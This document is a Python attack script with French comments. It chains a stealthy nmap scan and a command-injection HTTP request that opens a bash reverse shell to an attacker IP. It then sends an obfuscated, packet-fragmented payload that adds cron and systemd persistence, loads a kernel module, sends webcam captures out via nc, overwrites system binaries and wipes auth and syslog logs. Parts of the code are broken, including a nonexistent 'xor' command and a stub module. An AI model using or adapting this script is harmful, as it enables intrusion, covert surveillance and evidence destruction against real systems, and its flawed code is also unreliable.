import scapy.all as scapy
import socket
import time
import random
import base64
import subprocess
import os

# Configuration
target_ip = "<VM_IP>"  # Remplacer par l'IP de la VM
target_port = 80  # Port HTTP (ajuster selon le service)
attacker_ip = "192.168.1.100"  # IP de l'attaquant
attacker_port = 4444  # Port C2
exfil_port = 4445  # Port exfiltration

# Fonction 1 : Scan réseau furtif
def network_scan():
    print("Lancement du scan réseau...")
    subprocess.run(["nmap", "-sS", "-A", "-p-", "-f", "--randomize-ports", "--randomize-hosts", "--source-ip", "192.168.1.254", target_ip], timeout=200)
    print("Scan terminé. Port cible identifié.")

# Fonction 2 : Exploitation via command injection
def command_injection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + target_ip.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 100\r\n"
            b"\r\n"
            b"cmd=bash -c 'bash -i >& /dev/tcp/" + attacker_ip.encode() + b"/" + str(attacker_port).encode() + b" 0>&1'\r\n"
        )
        s.send(payload)
        response = s.recv(1024)
        print(f"Response: {response.decode(errors='ignore')}")
        s.close()
    except Exception as e:
        print(f"Erreur lors de l'injection: {e}")

# Fonction 3 : Installation du rootkit noyau et webcam access
def install_rootkit():
    try:
        # Module noyau simplifié (simulé)
        kernel_module = (
            "#include <linux/module.h>\n"
            "#include <linux/kernel.h>\n"
            "#include <linux/netfilter.h>\n"
            "static int __init hideko_init(void) { return 0; }\n"
            "static void __exit hideko_exit(void) {}\n"
            "module_init(hideko_init);\n"
            "module_exit(hideko_exit);\n"
        ).encode()
        # Payload rootkit : module, C2, webcam, exfiltration
        malicious_script = (
            "#!/bin/bash\n"
            f"echo '* * * * * root insmod /tmp/hideko.ko; ffmpeg -i /dev/video0 -vframes 1 /tmp/webcam.jpg; cat /tmp/webcam.jpg | base64 | nc {attacker_ip} {exfil_port}' >> /etc/crontab\n"
            "echo '[Unit]\nDescription=Hideko\n[Service]\nExecStart=/tmp/malicious.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/hideko.service\n"
            f"echo '{base64.b64encode(kernel_module).decode()}' | base64 -d > /tmp/hideko.c\n"
            "gcc -c /tmp/hideko.c -o /tmp/hideko.o\n"
            "ld -r -o /tmp/hideko.ko /tmp/hideko.o\n"
            "insmod /tmp/hideko.ko\n"
            "echo 'infected' > /bin/ls\n"
            "echo 'infected' > /bin/netstat\n"
            "echo 'malicious' > /tmp/malicious.sh\n"
            "chmod +x /tmp/malicious.sh\n"
            f"while true; do nc -l {attacker_port} & sleep 60; done &\n"  # Connexion C2 en attente
            "echo '' > /var/log/syslog\n"
            "echo '' > /var/log/auth.log\n"
            "touch -r /bin/bash /bin/ls\n"
            "touch -r /bin/bash /bin/netstat\n"
        ).encode()
        # Double XOR pour obfuscation
        xor_key1 = random.randint(1, 255)
        xor_key2 = random.randint(1, 255)
        xor_payload = bytes(b ^ xor_key1 for b in malicious_script)
        xor_payload = bytes(b ^ xor_key2 for b in xor_payload)
        encoded_payload = base64.b64encode(xor_payload).decode()
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + target_ip.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: " + str(len(encoded_payload) + 60).encode() + b"\r\n"
            b"\r\n"
            b"cmd=echo " + encoded_payload.encode() + b" | base64 -d | xxd -r -p | bash -c 'cat | xor " + str(xor_key2).encode() + b" | xor " + str(xor_key1).encode() + b" | bash'\r\n"
        )
        # Envoyer via paquets fragmentés
        ip = scapy.IP(dst=target_ip, flags="MF", frag=0)
        tcp = scapy.TCP(dport=target_port, sport=random.randint(1024, 65535), flags="PA")
        fragments = scapy.fragment(ip / tcp / payload, fragsize=4)
        for frag in fragments:
            scapy.send(frag, verbose=0)
            time.sleep(random.uniform(0.01, 0.03))
    except Exception as e:
        print(f"Erreur lors de l'installation du rootkit: {e}")

# Exécuter l'exploit
if __name__ == "__main__":
    print("Démarrage de l'exploit...")
    network_scan()
    print("Tentative d'injection de commande...")
    command_injection()
    print("Installation du rootkit, webcam access, et exfiltration...")
    for _ in range(5):
        install_rootkit()
        time.sleep(random.uniform(0.1, 0.2))
    print("Exploit terminé.")